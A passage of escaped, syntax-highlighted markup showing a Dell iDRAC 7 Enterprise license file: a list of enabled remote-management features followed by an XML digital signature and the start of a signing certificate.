class=\"s\"\u003e\u0026#34;18\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Dedicated NIC\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;19\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Directory Services\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;20\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Two-Factor Authentication\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;21\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Single Sign-On\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;22\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;PK Authentication\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;23\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Crash Screen Capture\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;24\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Crash Video Capture\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;25\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Boot Capture\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;26\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Console\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;27\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Flash Partitions\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;28\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Console Collaboration\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;29\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Device Monitoring\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;30\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Inventory\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;31\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Storage Monitoring\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;32\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Firmware Update\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;33\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Firmware Configuration\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;34\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Inventory Export\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;35\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Operating System Deployment\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;36\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Backup and Restore\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;37\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Part Replacement\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;38\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;SSH\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;39\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote File Share\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;40\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Folders\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;41\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Web GUI\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;42\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Network Time Protocol\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;43\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Email Alerts\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;44\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Security Lockout\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;45\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;253\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Integrated Dell Remote Access Controller 7 Enterprise\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;/lns:LicenseData\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Signature\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:dsig=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:SignedInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:CanonicalizationMethod\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2001/10/xml-exc-c14n#\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:SignatureMethod\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#rsa-sha1\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Reference\u003c/span\u003e \u003cspan class=\"na\"\u003eURI=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Transforms\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Transform\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:Transforms\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:DigestMethod\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#sha1\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:DigestValue\u0026gt;\u003c/span\u003eDrtnjP0vUsyT+18jazjmiaGrvc0=\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:DigestValue\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:Reference\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:SignedInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:SignatureValue\u0026gt;\u003c/span\u003eQg4Omx1ZGrVllUPbg/X25aJxK5qlNCF/G04NLwXhbmpqoplSRkCCUgb+6TvVz9b3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUt7sSa/WjA0mv+mbcqIENTAnpveIkIOQPR3mdjCBwX2cLYieV9nOIGobxqHU7o97\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eQjbSAkmTHcRo0PI6mP8tc7Od4WNWMZ48rrUBeOrVOr1EZeptPUbeaSofy4nvlzbC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epcpzZLbjAITT157r9KiFe9joG2hCEClrQPO0ScXHgKXrAWrQE9wX7e2De4uCvJwI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehGWpJzDQNJJZbsWhDoZJn/59G/KRjzxIHIzIpUt1XPPIGHl5yMXDaRFcIMES0RuJ\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSWZS8tt9E001Fr/8/jQNgA==\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:SignatureValue\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:KeyInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:X509Data\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:X509Certificate\u0026gt;\u003c/span\u003eMIIDTjCCAjagAwIBAgIBATANBgkqhkiG9w0BAQUFADBRMRMwEQYDVQQKEwpEZWxs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLCBJbmMuMSEwHwYDVQQLExhFbWJlZGRlZCBMaWNlbnNlIE1hbmFnZXIxFzAVBgNV\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBAMTDkNBIENlcnRpZmljYXRlMB4XDTEwMDEwMTAwMDAwMFoXDTM1MTIzMTIzNTk1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOVowVjETMBEGA1UEChMKRGVsbCwgSW5jLjEhMB8GA1UECxMYRW1iZWRkZWQgTGlj\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eZW5zZSBNYW5hZ2VyMRwwGgYDVQQDExNTaWduaW5nIENlcnRpZmljYXRlMIIBIjAN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqbRo2DZtkjxl5YtqD5ePYdzrWbkU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eYQJwVaWYe1tE7ZAdou5TLTsjPnaa1cLcPTexn+cq8YjukIVwkwJP7yJ5GkrYGUnf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0Q6unWWgwcgTStlpflz31e8AbxXqNYZEFvEktojYS0kAfiYES+H02GUU5PtV7B9Y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBbtZEowU2DPuqRGG1FF8mAsp1vojcbQGx+nS2Of47oQJRrJlh28COXyf2w/+IRAz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRmeYin+9pisfrT9fmlUtxa7sAAV/KZFRx8ED31YiktXgI/u/PNnHlchiCMaL6pzA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 